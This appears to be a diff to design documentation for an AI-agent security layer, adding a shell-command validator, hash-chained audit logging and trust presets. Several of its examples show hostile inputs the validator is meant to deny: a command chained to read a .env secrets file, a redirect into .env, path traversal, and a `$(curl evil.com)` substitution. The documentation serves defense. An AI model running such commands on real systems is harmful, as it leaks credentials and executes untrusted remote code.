@@ -72,13 +72,14 @@ The admission controller pipeline runs **before** every agent invocation. Contro
 Guardian.createDefault() pipeline:
 
 MUTATING PHASE:
-  1. InputSanitizer     — strip invisible Unicode, detect prompt injection
+  1. InputSanitizer        — strip invisible Unicode, detect prompt injection
 
 VALIDATING PHASE:
-  2. RateLimiter        — burst/minute/hour windows per agent
-  3. CapabilityController — per-agent permission enforcement
-  4. SecretScanController — scan content params for 28+ credential patterns
-  5. DeniedPathController — block sensitive file paths with normalization
+  2. RateLimiter           — burst/minute/hour windows per agent
+  3. CapabilityController  — per-agent permission enforcement
+  4. SecretScanController  — scan content params for 28+ credential patterns
+  5. DeniedPathController  — block sensitive file paths with normalization
+  6. ShellCommandController — tokenize + validate shell commands (when allowedCommands configured)
 ```
 
 Wired into: `Runtime.dispatchMessage()` before `agent.onMessage()`.
@@ -209,6 +210,32 @@ Blocks access to sensitive file paths. Performs path normalization to prevent tr
 
 Example: `foo/../../.env` → normalizes → detects traversal → denied.
 
+### 1.6 ShellCommandController (Validating)
+
+**File:** `src/guardian/shell-command-controller.ts`
+
+Validates shell commands by tokenizing POSIX shell syntax and checking each sub-command against allowed lists. Only fires on `execute_command` actions.
+
+**Why simple string matching isn't enough:**
+A command like `ls -la && cat .env` looks safe if you only check the first word (`ls`). The shell tokenizer splits this into two commands and validates each independently.
+
+**Tokenizer capabilities:**
+- Handles single/double quoting (`echo "hello && world"` → one command, not two)
+- Splits on chain operators: `&&`, `||`, `;`, `|`
+- Detects redirect targets: `echo foo > .env` → checks `.env` against denied paths
+- Flags subshell substitution: `$(curl evil.com)` → denied
+
+**Validation:**
+1. Tokenize the input string
+2. Split into sub-commands by chain operators
+3. Each sub-command name must be in `allowedCommands`
+4. Each argument and redirect target checked against denied paths
+5. Subshell substitutions are flagged as potentially dangerous
+
+**Deny-by-default:** If the tokenizer can't fully parse the input (unclosed quotes, unrecognized syntax), the command is denied.
+
+Enabled when `assistant.tools.allowedCommands` is configured in the config.
+
 ---
 
 ## Layer 2: Output Guardian (Inline, Real-Time)
@@ -282,9 +309,16 @@ The Sentinel also listens for `guardian.critical` events for immediate response 
 
 ## AuditLog
 
-**File:** `src/guardian/audit-log.ts`
+**File:** `src/guardian/audit-log.ts`, `src/guardian/audit-persistence.ts`
 
-In-memory ring buffer that records all security events. Foundation for Sentinel analysis and operational visibility.
+In-memory ring buffer that records all security events, backed by optional SHA-256 hash-chained JSONL persistence. Foundation for Sentinel analysis and operational visibility.
+
+**Persistence:** When enabled (default), every event is also appended to `~/.guardianagent/audit/audit.jsonl` with a SHA-256 hash chain. Each entry stores `{ event, previousHash, hash }`. This provides:
+- **Crash recovery** — events survive process restarts via `rehydrate()`
+- **Tamper detection** — `verifyChain()` streams the file and recomputes hashes to detect modifications
+- **Non-blocking writes** — persistence is fire-and-forget from the hot path
+
+The chain can be verified via `GET /api/audit/verify` or the web Security page.
 
 ### Event Types (12)
 
@@ -384,7 +418,30 @@ guardian:
 
   auditLog:
     maxEvents: 10000
+    persistenceEnabled: true              # default: true
+    auditDir: ~/.guardianagent/audit/     # default
+
+  # Trust presets: one-line security posture (locked | safe | balanced | power)
+  # trustPreset: balanced
 ```
+
+### Trust Presets
+
+Instead of tuning each field individually, set a trust preset for a complete security posture:
+
+```yaml
+guardian:
+  trustPreset: locked    # locked | safe | balanced | power
+```
+
+| Preset | Capabilities | Rate Limit | Tool Policy |
+|--------|-------------|------------|-------------|
+| **locked** | read_files only | 10/min, 100/hr | approve_each |
+| **safe** | read_files, read_email | 20/min, 300/hr | approve_by_policy |
+| **balanced** | read/write/exec/git/email | 30/min, 500/hr | approve_by_policy |
+| **power** | all capabilities | 60/min, 2000/hr | autonomous |
+
+Priority: user explicit config > preset > defaults. See [TRUST-PRESETS-SPEC.md](../specs/TRUST-PRESETS-SPEC.md).
 
 ---
 
